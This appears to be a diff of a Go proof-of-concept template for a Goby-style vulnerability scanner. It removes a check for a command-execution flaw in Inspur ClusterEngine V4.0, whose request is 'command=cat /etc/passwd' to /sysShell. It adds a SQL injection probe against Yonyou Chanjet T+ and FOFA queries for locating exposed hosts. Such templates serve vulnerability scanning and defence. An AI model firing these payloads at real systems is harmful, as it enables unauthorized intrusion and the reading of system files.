@@ -6,14 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+  "Name": "用友畅捷通T+ SQL注入漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
-  "Author": "",
-  "FofaQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
-  "GobyQuery": "title=\"TSCEV4.0\" || product=\"Inspur-ClusterEngine\" || \"ClusterEngine\"",
+  "PostTime": "2023-06-20",
+  "Author": "清晨",
+  "FofaQuery": "product=\"畅捷通-TPlus\"",
+  "GobyQuery": "product=\"畅捷通-TPlus\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,11 +31,14 @@ func init() {
     {
       "Request": {
         "method": "POST",
-        "uri": "/sysShell",
-        "follow_redirect": true,
-        "header": {},
+        "uri": "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex",
+        "follow_redirect": false,
+        "header": {
+          "Cookie": "ASP.NET_SessionId=; sid=admin",
+          "Content-Type": "text/plain"
+        },
         "data_type": "text",
-        "data": "op=doPlease&node=cu01&command=cat /etc/passwd"
+        "data": "{\"accNum\": \"6'\", \"functionTag\": \"SYS0104\", \"url\": \"\"}"
       },
       "ResponseTest": {
         "type": "group",
@@ -42,16 +46,9 @@ func init() {
         "checks": [
           {
             "type": "item",
-            "variable": "$code",
-            "operation": "==",
-            "value": "200",
-            "bz": ""
-          },
-          {
-            "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "root:",
+            "value": "附近有语法错误",
             "bz": ""
           }
         ]
@@ -107,7 +104,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞",
+      "Name": "用友畅捷通T+ SQL注入漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +113,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "tide ClusterEngineV4 sysShell rce",
+      "Name": "yonyou chanjettplus SQL Injection",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -131,8 +128,7 @@ func init() {
     "Service": null,
     "System": null,
     "Hardware": null
-  },
-  "PostTime": "2023-06-20"
+  }
 }`
 
 	ExpManager.AddExploit(NewExploit(
